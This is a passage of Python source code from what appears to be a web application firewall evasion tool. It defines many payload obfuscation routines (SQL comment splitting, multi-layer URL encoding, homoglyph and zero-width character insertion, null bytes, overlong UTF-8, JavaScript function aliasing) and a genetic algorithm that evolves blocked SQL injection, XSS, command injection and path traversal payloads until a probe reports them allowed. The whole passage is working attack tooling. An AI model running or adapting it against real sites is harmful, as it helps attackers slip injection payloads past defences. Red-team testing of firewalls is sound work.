            return s.lower()

        clean_orig = clean(original)
        clean_pert = clean(perturbed)

        if not clean_orig:
            return True

        # Compute character overlap ratio
        orig_chars = defaultdict(int)
        for ch in clean_orig:
            orig_chars[ch] += 1

        pert_chars = defaultdict(int)
        for ch in clean_pert:
            pert_chars[ch] += 1

        overlap = 0
        for ch, count in orig_chars.items():
            overlap += min(count, pert_chars.get(ch, 0))

        ratio = overlap / len(clean_orig)
        return ratio >= 0.4

    def _validate_payload_semantics(
        self,
        original: str,
        perturbed: str,
        context: PayloadContext = PayloadContext.GENERIC,
        threshold: float = 0.5,
    ) -> Tuple[float, bool]:
        """
        Validate that a perturbed payload still contains the core attack pattern.

        Checks the perturbed payload preserves the semantic meaning of the
        original based on the attack context (e.g., SQL keywords for SQLi).

        Args:
            original: The original payload before perturbation.
            perturbed: The payload after perturbation.
            context: The attack context to validate against.
            threshold: Minimum confidence score to consider valid (0-1).

        Returns:
            Tuple of (confidence_score, passes_threshold) where confidence_score
            is 0-1 indicating semantic preservation confidence.
        """
        if not original or not perturbed:
            return (0.0, False)

        score = 0.0

        if context == PayloadContext.SQL_INJECTION:
            score = self._sql_semantic_confidence(original, perturbed)
        elif context in (PayloadContext.XSS_REFLECTED, PayloadContext.XSS_STORED):
            score = self._xss_semantic_confidence(original, perturbed)
        elif context == PayloadContext.COMMAND_INJECTION:
            score = self._cmd_semantic_confidence(original, perturbed)
        elif context == PayloadContext.PATH_TRAVERSAL:
            score = self._path_semantic_confidence(original, perturbed)
        else:
            score = self._generic_semantic_confidence(original, perturbed)

        return (score, score >= threshold)

    def _sql_semantic_confidence(self, original: str, perturbed: str) -> float:
        """Compute semantic preservation confidence for SQL injection payloads."""
        def normalize(s: str) -> str:
            s = re.sub(r"/\*.*?\*/", " ", s, flags=re.DOTALL)
            s = re.sub(r"--.*$", "", s, flags=re.MULTILINE)
            s = re.sub(r"\s+", " ", s).strip().lower()
            for zwc in ZERO_WIDTH_CHARS:
                s = s.replace(zwc, "")
            return s

        norm_orig = normalize(original)
        norm_pert = normalize(perturbed)

        orig_kw = set(re.findall(
            r"\b(?:" + "|".join(re.escape(k) for k in SQL_KEYWORDS) + r")\b",
            norm_orig, re.IGNORECASE,
        ))
        pert_kw = set(re.findall(
            r"\b(?:" + "|".join(re.escape(k) for k in SQL_KEYWORDS) + r")\b",
            norm_pert, re.IGNORECASE,
        ))

        if not orig_kw:
            return 1.0
        return len(orig_kw & pert_kw) / len(orig_kw)

    def _xss_semantic_confidence(self, original: str, perturbed: str) -> float:
        """Compute semantic preservation confidence for XSS payloads."""
        triggers = [
            r"<\s*script", r"on\w+\s*=", r"javascript\s*:",
            r"eval\s*\(", r"alert\s*\(", r"document\.",
            r"<\s*img", r"<\s*svg", r"<\s*iframe",
        ]
        orig_count = sum(1 for t in triggers if re.search(t, original, re.IGNORECASE))
        pert_count = sum(1 for t in triggers if re.search(t, perturbed, re.IGNORECASE))

        if orig_count == 0:
            return 1.0
        return min(pert_count / orig_count, 1.0)

    def _cmd_semantic_confidence(self, original: str, perturbed: str) -> float:
        """Compute semantic preservation confidence for command injection payloads."""
        separators = [";", "|", "&&", "||", "`", "$("]
        orig_seps = sum(1 for s in separators if s in original)
        pert_seps = sum(1 for s in separators if s in perturbed)

        orig_cmds = set(re.findall(
            r"\b(" + "|".join(re.escape(k) for k in CMD_KEYWORDS) + r")\b",
            original, re.IGNORECASE,
        ))
        pert_cmds = set(re.findall(
            r"\b(" + "|".join(re.escape(k) for k in CMD_KEYWORDS) + r")\b",
            perturbed, re.IGNORECASE,
        ))

        sep_score = min(pert_seps / orig_seps, 1.0) if orig_seps > 0 else 1.0
        cmd_score = len(orig_cmds & pert_cmds) / len(orig_cmds) if orig_cmds else 1.0
        return (sep_score + cmd_score) / 2.0

    def _path_semantic_confidence(self, original: str, perturbed: str) -> float:
        """Compute semantic preservation confidence for path traversal payloads."""
        orig_traversals = original.count("../") + original.count("..\\")
        pert_traversals = perturbed.count("../") + perturbed.count("..\\")
        pert_traversals += perturbed.lower().count("%2e%2e%2f")
        pert_traversals += perturbed.lower().count("%2e%2e/")
        pert_traversals += perturbed.lower().count("..%2f")

        if orig_traversals == 0:
            return 1.0
        return min(pert_traversals / orig_traversals, 1.0)

    def _generic_semantic_confidence(self, original: str, perturbed: str) -> float:
        """Compute generic semantic preservation confidence via character overlap."""
        def clean(s: str) -> str:
            for zwc in ZERO_WIDTH_CHARS:
                s = s.replace(zwc, "")
            s = re.sub(r"\s+", "", s)
            s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
            return s.lower()

        clean_orig = clean(original)
        clean_pert = clean(perturbed)

        if not clean_orig:
            return 1.0

        orig_chars: Dict[str, int] = defaultdict(int)
        for ch in clean_orig:
            orig_chars[ch] += 1

        pert_chars: Dict[str, int] = defaultdict(int)
        for ch in clean_pert:
            pert_chars[ch] += 1

        overlap = 0
        for ch, count in orig_chars.items():
            overlap += min(count, pert_chars.get(ch, 0))

        return overlap / len(clean_orig)

    def filter_by_semantics(
        self,
        original: str,
        mutations: List[Tuple[PerturbationType, str]],
        context: PayloadContext = PayloadContext.GENERIC,
        threshold: float = 0.5,
    ) -> List[Tuple[PerturbationType, str, float]]:
        """
        Filter a list of mutations, keeping only those that preserve payload semantics.

        Args:
            original: The original payload.
            mutations: List of (perturbation_type, perturbed_payload) tuples.
            context: The attack context.
            threshold: Minimum semantic confidence to keep (default 0.5).

        Returns:
            List of (perturbation_type, perturbed_payload, confidence) tuples
            that passed the threshold.
        """
        results: List[Tuple[PerturbationType, str, float]] = []
        for pert_type, perturbed in mutations:
            confidence, passes = self._validate_payload_semantics(
                original, perturbed, context, threshold,
            )
            if passes:
                results.append((pert_type, perturbed, confidence))
        return results

    # ── Whitespace perturbations ──────────────────────────────────────────────

    def _whitespace_insert(self, payload: str) -> str:
        """Insert spaces between keyword characters."""
        all_kw = SQL_KEYWORDS | XSS_KEYWORDS
        result = payload
        for kw in sorted(all_kw, key=len, reverse=True):
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original_word = match.group()
                spaced = " ".join(original_word)
                result = result[:match.start()] + spaced + result[match.end():]
                break  # One substitution at a time
        return result

    def _tab_insert(self, payload: str) -> str:
        """Insert tab characters between tokens."""
        return re.sub(r"(\s)", "\t", payload, count=3)

    def _newline_insert(self, payload: str) -> str:
        """Insert newline characters at strategic points."""
        result = payload
        # Insert newlines before keywords
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
            result = re.sub(
                r"(?i)\b(" + re.escape(kw) + r")\b",
                r"\n\1",
                result,
                count=1,
            )
        return result

    # ── Comment injection ─────────────────────────────────────────────────────

    def _sql_comment_inline(self, payload: str) -> str:
        """Insert SQL inline comments between keyword characters."""
        all_kw = list(SQL_KEYWORDS)
        result = payload
        for kw in all_kw:
            if re.search(re.escape(kw), result, re.IGNORECASE):
                commented = "/**/".join(kw)
                result = re.sub(
                    r"(?i)\b" + re.escape(kw) + r"\b",
                    commented,
                    result,
                    count=1,
                )
                break
        return result

    def _sql_comment_block(self, payload: str) -> str:
        """Insert MySQL conditional comments."""
        result = payload
        kw_list = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE"]
        for kw in kw_list:
            result = re.sub(
                r"(?i)\b(" + re.escape(kw) + r")\b",
                r"/*!50000 \1 */",
                result,
                count=1,
            )
        return result

    def _html_comment_inject(self, payload: str) -> str:
        """Insert HTML comments to break pattern matching."""
        result = payload
        tag_pattern = re.compile(r"(<\s*)(\w+)")
        match = tag_pattern.search(result)
        if match:
            result = result[:match.end()] + "<!--x-->" + result[match.end():]
        return result

    def _css_comment_inject(self, payload: str) -> str:
        """Insert CSS comments in style-based payloads."""
        return payload.replace("expression", "exp/**/ression").replace("url", "ur/**/l")

    def _js_comment_inject(self, payload: str) -> str:
        """Insert JavaScript comments to break signatures."""
        result = payload
        js_fns = ["alert", "eval", "prompt", "confirm", "setTimeout", "setInterval"]
        for fn in js_fns:
            result = re.sub(
                r"(?i)\b(" + re.escape(fn) + r")\s*\(",
                r"\1/*x*/(",
                result,
                count=1,
            )
        return result

    # ── Case alternation ──────────────────────────────────────────────────────

    def _case_upper(self, payload: str) -> str:
        """Convert payload to uppercase."""
        return payload.upper()

    def _case_lower(self, payload: str) -> str:
        """Convert payload to lowercase."""
        return payload.lower()

    def _case_alternate(self, payload: str) -> str:
        """Alternate character case (sElEcT)."""
        result = []
        alpha_idx = 0
        for ch in payload:
            if ch.isalpha():
                if alpha_idx % 2 == 0:
                    result.append(ch.lower())
                else:
                    result.append(ch.upper())
                alpha_idx += 1
            else:
                result.append(ch)
        return "".join(result)

    def _case_random(self, payload: str) -> str:
        """Randomize character case."""
        return "".join(
            ch.upper() if random.random() > 0.5 else ch.lower()
            for ch in payload
        )

    # ── URL encoding ──────────────────────────────────────────────────────────

    def _url_encode_single(self, payload: str) -> str:
        """Single URL-encode special characters."""
        result = []
        encode_chars = set("'\";<>()=&|!+*/%\\@#$^`~{}[]")
        for ch in payload:
            if ch in encode_chars:
                result.append(f"%{ord(ch):02X}")
            else:
                result.append(ch)
        return "".join(result)

    def _url_encode_double(self, payload: str) -> str:
        """Double URL-encode special characters."""
        result = []
        encode_chars = set("'\";<>()=&|")
        for ch in payload:
            if ch in encode_chars:
                hex_val = f"{ord(ch):02X}"
                # Double encode: %25 + hex
                result.append(f"%25{hex_val}")
            else:
                result.append(ch)
        return "".join(result)

    def _url_encode_triple(self, payload: str) -> str:
        """Triple URL-encode critical characters."""
        result = []
        encode_chars = set("'\"<>()")
        for ch in payload:
            if ch in encode_chars:
                hex_val = f"{ord(ch):02X}"
                # Triple encode: %2525 + hex
                result.append(f"%2525{hex_val}")
            else:
                result.append(ch)
        return "".join(result)

    # ── HTML entities ─────────────────────────────────────────────────────────

    def _html_entity_decimal(self, payload: str) -> str:
        """Convert characters to decimal HTML entities."""
        result = []
        for ch in payload:
            if ch.isalpha() and random.random() < 0.4:
                result.append(f"&#{ord(ch)};")
            else:
                result.append(ch)
        return "".join(result)

    def _html_entity_hex(self, payload: str) -> str:
        """Convert characters to hexadecimal HTML entities."""
        result = []
        for ch in payload:
            if ch.isalpha() and random.random() < 0.4:
                result.append(f"&#x{ord(ch):X};")
            else:
                result.append(ch)
        return "".join(result)

    def _html_entity_named(self, payload: str) -> str:
        """Use named HTML entities where available."""
        named_entities = {
            "<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;",
            "'": "&apos;", " ": "&nbsp;", "/": "&sol;", "\\": "&bsol;",
            "=": "&equals;", "(": "&lpar;", ")": "&rpar;",
        }
        result = []
        for ch in payload:
            if ch in named_entities:
                result.append(named_entities[ch])
            else:
                result.append(ch)
        return "".join(result)

    # ── Unicode variants ──────────────────────────────────────────────────────

    def _unicode_fullwidth(self, payload: str) -> str:
        """Convert ASCII to fullwidth Unicode characters."""
        result = []
        for ch in payload:
            cp = ord(ch)
            if 0x21 <= cp <= 0x7E:
                result.append(chr(cp + FULLWIDTH_OFFSET))
            elif ch == " ":
                result.append("\u3000")  # Fullwidth space
            else:
                result.append(ch)
        return "".join(result)

    def _unicode_halfwidth(self, payload: str) -> str:
        """Convert fullwidth back to halfwidth selectively."""
        result = []
        for ch in payload:
            cp = ord(ch)
            # Fullwidth range: FF01-FF5E -> 0021-007E
            if 0xFF01 <= cp <= 0xFF5E:
                if random.random() < 0.5:
                    result.append(chr(cp - FULLWIDTH_OFFSET))
                else:
                    result.append(ch)
            else:
                result.append(ch)
        return "".join(result)

    def _unicode_superscript(self, payload: str) -> str:
        """Replace digits with superscript Unicode equivalents."""
        superscript_map = {
            "0": "\u2070", "1": "\u00b9", "2": "\u00b2", "3": "\u00b3",
            "4": "\u2074", "5": "\u2075", "6": "\u2076", "7": "\u2077",
            "8": "\u2078", "9": "\u2079",
        }
        result = []
        for ch in payload:
            if ch in superscript_map and random.random() < 0.5:
                result.append(superscript_map[ch])
            else:
                result.append(ch)
        return "".join(result)

    def _unicode_subscript(self, payload: str) -> str:
        """Replace digits with subscript Unicode equivalents."""
        subscript_map = {
            "0": "\u2080", "1": "\u2081", "2": "\u2082", "3": "\u2083",
            "4": "\u2084", "5": "\u2085", "6": "\u2086", "7": "\u2087",
            "8": "\u2088", "9": "\u2089",
        }
        result = []
        for ch in payload:
            if ch in subscript_map and random.random() < 0.5:
                result.append(subscript_map[ch])
            else:
                result.append(ch)
        return "".join(result)

    def _unicode_combining(self, payload: str) -> str:
        """Add combining diacritical marks to break pattern matching."""
        combining_marks = [
            "\u0300", "\u0301", "\u0302", "\u0303", "\u0304",  # Accents
            "\u0305", "\u0306", "\u0307", "\u0308", "\u0309",
            "\u030a", "\u030b", "\u030c", "\u030d",
        ]
        result = []
        for ch in payload:
            result.append(ch)
            if ch.isalpha() and random.random() < 0.2:
                result.append(random.choice(combining_marks))
        return "".join(result)

    # ── Homoglyph substitution ────────────────────────────────────────────────

    def _homoglyph_cyrillic(self, payload: str) -> str:
        """Replace Latin chars with Cyrillic homoglyphs."""
        cyrillic_map = {
            k: [v for v in vs if "\u0400" <= v <= "\u04FF"]
            for k, vs in HOMOGLYPH_MAP.items()
        }
        result = []
        for ch in payload:
            candidates = cyrillic_map.get(ch, [])
            if candidates and random.random() < 0.35:
                result.append(random.choice(candidates))
            else:
                result.append(ch)
        return "".join(result)

    def _homoglyph_greek(self, payload: str) -> str:
        """Replace Latin chars with Greek homoglyphs."""
        greek_map = {
            k: [v for v in vs if "\u0370" <= v <= "\u03FF"]
            for k, vs in HOMOGLYPH_MAP.items()
        }
        result = []
        for ch in payload:
            candidates = greek_map.get(ch, [])
            if candidates and random.random() < 0.35:
                result.append(random.choice(candidates))
            else:
                result.append(ch)
        return "".join(result)

    def _homoglyph_math(self, payload: str) -> str:
        """Replace Latin chars with mathematical symbol homoglyphs."""
        math_map = {
            k: [v for v in vs if "\u2100" <= v <= "\u21FF" or "\u2200" <= v <= "\u22FF"]
            for k, vs in HOMOGLYPH_MAP.items()
        }
        result = []
        for ch in payload:
            candidates = math_map.get(ch, [])
            if candidates and random.random() < 0.35:
                result.append(random.choice(candidates))
            else:
                result.append(ch)
        return "".join(result)

    # ── Zero-width injection ──────────────────────────────────────────────────

    def _zero_width_space(self, payload: str) -> str:
        """Insert zero-width spaces between keyword characters."""
        zwsp = "\u200b"
        result = payload
        all_kw = sorted(SQL_KEYWORDS | XSS_KEYWORDS, key=len, reverse=True)
        for kw in all_kw[:15]:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                broken = zwsp.join(original)
                result = result[:match.start()] + broken + result[match.end():]
        return result

    def _zero_width_joiner(self, payload: str) -> str:
        """Insert zero-width joiners within keywords."""
        zwj = "\u200d"
        result = payload
        all_kw = sorted(SQL_KEYWORDS | XSS_KEYWORDS, key=len, reverse=True)
        for kw in all_kw[:10]:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                mid = len(original) // 2
                broken = original[:mid] + zwj + original[mid:]
                result = result[:match.start()] + broken + result[match.end():]
        return result

    def _zero_width_non_joiner(self, payload: str) -> str:
        """Insert zero-width non-joiners to break tokenization."""
        zwnj = "\u200c"
        result = []
        for i, ch in enumerate(payload):
            result.append(ch)
            if ch.isalpha() and i < len(payload) - 1 and payload[i + 1].isalpha():
                if random.random() < 0.15:
                    result.append(zwnj)
        return "".join(result)

    # ── Byte-level perturbations ──────────────────────────────────────────────

    def _null_byte(self, payload: str) -> str:
        """Insert null bytes before keywords."""
        result = payload
        all_kw = list(SQL_KEYWORDS | XSS_KEYWORDS)[:10]
        for kw in all_kw:
            result = re.sub(
                r"(?i)\b(" + re.escape(kw) + r")",
                "\x00\\1",
                result,
                count=1,
            )
        return result

    def _backspace_char(self, payload: str) -> str:
        """Insert backspace characters to confuse length-based filters."""
        result = []
        for ch in payload:
            result.append(ch)
            if random.random() < 0.1:
                # Insert char + backspace (visually cancels but adds bytes)
                dummy = random.choice(string.ascii_lowercase)
                result.append(dummy)
                result.append("\x08")
        return "".join(result)

    # ── String manipulation ───────────────────────────────────────────────────

    def _string_concat_split(self, payload: str) -> str:
        """Split keywords using string concatenation operators."""
        result = payload
        # SQL: 'SEL' + 'ECT' or 'SEL' || 'ECT'
        for kw in ["SELECT", "UNION", "INSERT", "DELETE", "SCRIPT", "ALERT"]:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                mid = len(original) // 2
                split = f"'{original[:mid]}'+'{original[mid:]}'"
                result = result[:match.start()] + split + result[match.end():]
                break
        return result

    def _char_code_construct(self, payload: str) -> str:
        """Construct strings using character codes."""
        result = payload
        # JavaScript: String.fromCharCode(...)
        for kw in ["alert", "eval", "script"]:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                char_codes = ",".join(str(ord(c)) for c in original)
                replacement = f"String.fromCharCode({char_codes})"
                result = result[:match.start()] + replacement + result[match.end():]
                break
        return result

    # ── Numeric representations ───────────────────────────────────────────────

    def _hex_representation(self, payload: str) -> str:
        """Convert string literals to hex representation."""
        result = payload
        # SQL: 0x53454C454354 for SELECT
        for kw in ["SELECT", "UNION", "FROM", "WHERE"]:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            match = pattern.search(result)
            if match:
                original = match.group()
                hex_str = "0x" + original.encode("utf-8").hex()
                result = result[:match.start()] + hex_str + result[match.end():]
                break
        return result

    def _octal_representation(self, payload: str) -> str:
        """Convert characters to octal escape sequences."""
        result = []
        for ch in payload:
            if ch.isalpha() and random.random() < 0.3:
                result.append(f"\\{ord(ch):03o}")
            else:
                result.append(ch)
        return "".join(result)

    # ── Encoding layers ───────────────────────────────────────────────────────

    def _base64_encode(self, payload: str) -> str:
        """Base64 encode the payload (with decode wrapper)."""
        import base64
        encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        # Return as atob() call for JavaScript context
        return f"atob('{encoded}')"

    def _utf7_encode(self, payload: str) -> str:
        """UTF-7 encode special characters."""
        result = []
        for ch in payload:
            if ch in "<>\"'&":
                # UTF-7 style: +ADw- for <
                utf7_byte = ch.encode("utf-16-be").hex()
                result.append(f"+{utf7_byte}-")
            else:
                result.append(ch)
        return "".join(result)

    def _overlong_utf8(self, payload: str) -> str:
        """Create overlong UTF-8 representations of characters."""
        result = []
        for ch in payload:
            cp = ord(ch)
            if cp < 128 and ch in "/<>\"'":
                # 2-byte overlong encoding of ASCII
                byte1 = 0xC0 | (cp >> 6)
                byte2 = 0x80 | (cp & 0x3F)
                result.append(f"%{byte1:02X}%{byte2:02X}")
            else:
                result.append(ch)
        return "".join(result)

    # ── Protocol-level ────────────────────────────────────────────────────────

    def _parameter_pollution(self, payload: str) -> str:
        """Split payload across multiple parameters (HPP)."""
        # Simulate splitting: param=val1&param=val2
        if "=" in payload:
            parts = payload.split("=", 1)
            if len(parts) == 2:
                name, value = parts
                mid = len(value) // 2
                return f"{name}={value[:mid]}&{name}={value[mid:]}"
        # For non-parameter payloads, split with HPP indicator
        mid = len(payload) // 2
        return f"q={payload[:mid]}&q={payload[mid:]}"

    def _chunk_transfer(self, payload: str) -> str:
        """Simulate chunked transfer encoding splitting."""
        chunk_size = max(3, len(payload) // 4)
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    def _multipart_boundary(self, payload: str) -> str:
        """Wrap payload in multipart boundary format."""
        boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
        return (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"input\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        )

    # ── JSON/data perturbations ───────────────────────────────────────────────

    def _json_unicode_escape(self, payload: str) -> str:
        """Convert characters to JSON unicode escape sequences."""
        result = []
        for ch in payload:
            if ch.isalpha() and random.random() < 0.4:
                result.append(f"\\u{ord(ch):04X}")
            else:
                result.append(ch)
        return "".join(result)

    def _numeric_char_ref(self, payload: str) -> str:
        """Convert characters to numeric character references."""
        result = []
        for ch in payload:
            if ch in "<>\"'&;()=" and random.random() < 0.7:
                result.append(f"&#x{ord(ch):04X};")
            else:
                result.append(ch)
        return "".join(result)

    # ── Semantic substitution ─────────────────────────────────────────────────

    def _semantic_synonym(self, payload: str) -> str:
        """Replace SQL/XSS functions with semantic equivalents."""
        synonyms = {
            r"(?i)\bSELECT\b": "SELECT",  # preserved
            r"(?i)\bUNION\s+ALL\b": "UNION DISTINCT",
            r"(?i)\bSUBSTRING\b": "MID",
            r"(?i)\bASCII\b": "ORD",
            r"(?i)\bCONCAT\b": "CONCAT_WS",
            r"(?i)\bIF\b": "CASE WHEN 1 THEN",
            r"(?i)\balert\b": "prompt",
            r"(?i)\bdocument\.cookie\b": "document['cookie']",
            r"(?i)\beval\b": "Function",
        }
        result = payload
        for pattern, replacement in synonyms.items():
            result = re.sub(pattern, replacement, result, count=1)
        return result

    def _function_alias(self, payload: str) -> str:
        """Replace functions with aliases or alternative invocations."""
        aliases = {
            r"(?i)\balert\s*\(": "window['al'+'ert'](",
            r"(?i)\beval\s*\(": "window['ev'+'al'](",
            r"(?i)\bsetTimeout\s*\(": "window['setT'+'imeout'](",
            r"(?i)\bdocument\b": "window['document']",
            r"(?i)\bcookie\b": "['co'+'okie']",
            r"(?i)\blocation\b": "window['loc'+'ation']",
        }
        result = payload
        for pattern, replacement in aliases.items():
            result = re.sub(pattern, replacement, result, count=1)
        return result

    def _operator_substitute(self, payload: str) -> str:
        """Substitute operators with equivalents."""
        substitutions = [
            (r"(?i)\bOR\b", "||"),
            (r"(?i)\bAND\b", "&&"),
            (r"(?i)\bNOT\b", "!"),
            ("=", " LIKE "),
            ("<>", " NOT LIKE "),
            ("!=", " NOT IN "),
        ]
        result = payload
        for pattern, replacement in substitutions[:3]:
            result = re.sub(pattern, replacement, result, count=1)
        return result

    def record_result(
        self, perturbation: PerturbationType, success: bool
    ) -> None:
        """Record whether a perturbation led to evasion success."""
        with self._lock:
            self._success_rates[perturbation.name].append(success)

    def get_success_rates(self) -> Dict[str, float]:
        """Get success rate for each perturbation technique."""
        with self._lock:
            rates: Dict[str, float] = {}
            for name, results in self._success_rates.items():
                if results:
                    rates[name] = round(sum(results) / len(results), 4)
            return dict(sorted(rates.items(), key=lambda x: x[1], reverse=True))

    def get_stats(self) -> Dict[str, Any]:
        """Get perturbation engine statistics."""
        with self._lock:
            return {
                "total_perturbations": self._perturbation_count,
                "techniques_available": len(self._technique_registry),
                "success_rates": self.get_success_rates(),
            }


# ════════════════════════════════════════════════════════════════════════════════
# EvasionGenerator — Genetic algorithm for adversarial payload evolution
# ════════════════════════════════════════════════════════════════════════════════


class EvasionGenerator:
    """
    Generates adversarial payload variants using genetic algorithm evolution.

    Starts with a blocked payload, applies random perturbations, tests if
    the result is still blocked, and evolves using a genetic algorithm with
    tournament selection, crossover, and mutation.

    Usage:
        generator = EvasionGenerator(probe_fn=my_waf_test)
        evasions = generator.evolve(blocked_payload, generations=100)
        best = generator.get_best_payload()
        stats = generator.get_evolution_stats()
    """

    def __init__(
        self,
        probe_fn: Optional[Callable[[str], ProbeResult]] = None,
        perturbation_engine: Optional[PerturbationEngine] = None,
        feature_analyzer: Optional[FeatureAnalyzer] = None,
        population_size: int = POPULATION_SIZE,
        mutation_rate: float = MUTATION_RATE,
        crossover_rate: float = CROSSOVER_RATE,
        tournament_size: int = TOURNAMENT_SIZE,
        max_generations: int = MAX_GENERATIONS,
        elite_ratio: float = ELITE_RATIO,
    ) -> None:
        self._lock = threading.RLock()
        self._analyzer = feature_analyzer or FeatureAnalyzer()
        self._perturbation = perturbation_engine or PerturbationEngine(self._analyzer)
        self._probe_fn = probe_fn or self._default_probe
        self._population_size = population_size
        self._mutation_rate = mutation_rate
        self._crossover_rate = crossover_rate
        self._tournament_size = tournament_size
        self._max_generations = max_generations
        self._elite_ratio = elite_ratio
        self._population: List[AdversarialPayload] = []
        self._best_payloads: List[AdversarialPayload] = []
        self._generation: int = 0
        self._evasions_found: List[AdversarialPayload] = []
        self._fitness_history: List[Dict[str, float]] = []
        self._total_evaluations: int = 0
        self._stagnation_counter: int = 0
        self._best_fitness_ever: float = 0.0
        logger.info(
            "EvasionGenerator initialized: pop=%d, mut=%.2f, cross=%.2f, max_gen=%d, elite=%.2f",
            population_size, mutation_rate, crossover_rate, max_generations, elite_ratio,
        )

    def _default_probe(self, payload: str) -> ProbeResult:
        """Default probe using feature-based heuristic."""
        features = self._analyzer.extract_features(payload)
        score = 0.0
        score += features.keyword_density * 3.0
        score += features.special_char_ratio * 2.0
        score += min(features.string_entropy / 5.0, 1.0) * 1.5
        score += min(features.encoding_depth / 3.0, 1.0) * 2.0
        if features.payload_length > 500:
            score += 0.5
        if features.keyword_density > 0.3:
            score += 2.0
        if score > 3.0:
            return ProbeResult.BLOCKED
        elif score > 2.0:
            return ProbeResult.CHALLENGED
        else:
            return ProbeResult.ALLOWED

    def evolve(
        self,
        blocked_payload: str,
        context: PayloadContext = PayloadContext.GENERIC,
        max_generations: Optional[int] = None,
        target_evasions: int = 5,
    ) -> List[AdversarialPayload]:
        """
        Evolve a blocked payload through genetic algorithm to find evasions.

        Returns list of successful evasion payloads found during evolution.
        """
        with self._lock:
            if max_generations is None:
                max_generations = self._max_generations

            logger.info(
                "Starting genetic evolution: payload_len=%d, max_gen=%d, target=%d",
                len(blocked_payload), max_generations, target_evasions,
            )

            self._generation = 0
            self._evasions_found = []
            self._fitness_history = []
            self._stagnation_counter = 0
            self._best_fitness_ever = 0.0

            # Initialize population
            self._population = self._initialize_population(blocked_payload, context)

            for gen in range(max_generations):
                self._generation = gen + 1

                # Evaluate fitness
                self._evaluate_population(context)

                # Record stats
                fitnesses = [p.fitness_score for p in self._population]
                gen_stats = {
                    "generation": self._generation,
                    "best_fitness": max(fitnesses) if fitnesses else 0.0,
                    "avg_fitness": sum(fitnesses) / max(len(fitnesses), 1),
                    "min_fitness": min(fitnesses) if fitnesses else 0.0,
                    "evasions_found": len(self._evasions_found),
                    "population_size": len(self._population),
                }
                self._fitness_history.append(gen_stats)

                # Check for evasions
                for payload in self._population:
                    if payload.evasion_success and payload.payload_id not in {
                        e.payload_id for e in self._evasions_found
                    }:
                        self._evasions_found.append(payload)
                        logger.info(
                            "Evasion found at generation %d: fitness=%.4f",
                            self._generation, payload.fitness_score,
                        )

                # Check termination conditions
                if len(self._evasions_found) >= target_evasions:
                    logger.info("Target evasions reached: %d", len(self._evasions_found))
                    break

                # Check stagnation
                best_fitness = max(fitnesses) if fitnesses else 0.0
                if best_fitness > self._best_fitness_ever + EPSILON:
                    self._best_fitness_ever = best_fitness
                    self._stagnation_counter = 0
                else:
                    self._stagnation_counter += 1

                if self._stagnation_counter > 20:
                    logger.info("Stagnation detected at generation %d, injecting diversity", self._generation)
                    self._inject_diversity(blocked_payload, context)
                    self._stagnation_counter = 0

                # Selection, crossover, mutation
                new_population = self._next_generation(blocked_payload, context)
                self._population = new_population

                if self._generation % 25 == 0:
                    logger.debug(
                        "Generation %d: best=%.4f, avg=%.4f, evasions=%d",
                        self._generation, gen_stats["best_fitness"],
                        gen_stats["avg_fitness"], len(self._evasions_found),
                    )

            logger.info(
                "Evolution complete: %d generations, %d evasions found",
                self._generation, len(self._evasions_found),
            )

            return list(self._evasions_found)

    def _initialize_population(
        self, base_payload: str, context: PayloadContext
    ) -> List[AdversarialPayload]:
        """Initialize population with diverse perturbations of the base payload."""
        population: List[AdversarialPayload] = []
        techniques = self._perturbation.get_all_techniques()

        # Add base payload
        base = AdversarialPayload(
            original_payload=base_payload,
            mutated_payload=base_payload,
            generation=0,
            context=context,
        )
        population.append(base)

        # Generate initial diverse population
        for i in range(self._population_size - 1):
            # Random number of perturbations (1-4)
            n_perts = random.randint(1, min(4, len(techniques)))
            selected_perts = random.sample(techniques, n_perts)

            mutated = base_payload
            applied: List[str] = []
            types: List[PerturbationType] = []

            for pert in selected_perts:
                mutated = self._perturbation.apply(mutated, pert)
                applied.append(pert.name)
                types.append(pert)

            individual = AdversarialPayload(
                original_payload=base_payload,
                mutated_payload=mutated,
                perturbations_applied=applied,
                perturbation_types=types,
                generation=0,
                context=context,
                parent_ids=[base.payload_id],
            )
            population.append(individual)

        return population

    def _evaluate_population(self, context: PayloadContext) -> None:
        """Evaluate fitness of all individuals in the population."""
        for individual in self._population:
            if individual.fitness_score > 0 and individual.generation < self._generation:
                continue  # Already evaluated in a previous generation

            fitness = self._compute_fitness(individual, context)
            individual.fitness_score = fitness
            self._total_evaluations += 1

    def _compute_fitness(
        self, individual: AdversarialPayload, context: PayloadContext
    ) -> float:
        """
        Compute fitness score for an individual.

        Fitness components:
        1. Evasion success (primary goal): high reward for bypassing WAF
        2. Semantic preservation: penalty if payload loses attack semantics
        3. Feature distance: reward for moving away from blocked feature space
        4. Perturbation efficiency: reward for fewer perturbations needed
        5. Payload length penalty: slight penalty for very long payloads
        """
        fitness = 0.0

        # 1. Probe result
        probe_result = self._probe_fn(individual.mutated_payload)
        if probe_result == ProbeResult.ALLOWED:
            fitness += 10.0
            individual.evasion_success = True
        elif probe_result == ProbeResult.CHALLENGED:
            fitness += 5.0
        elif probe_result == ProbeResult.BLOCKED:
            fitness += 0.0
        elif probe_result == ProbeResult.TIMEOUT:
            fitness += 3.0  # Timeout might indicate partial evasion

        individual.waf_responses.append({
            "result": probe_result.name,
            "generation": self._generation,
            "timestamp": time.time(),
        })

        # 2. Semantic preservation
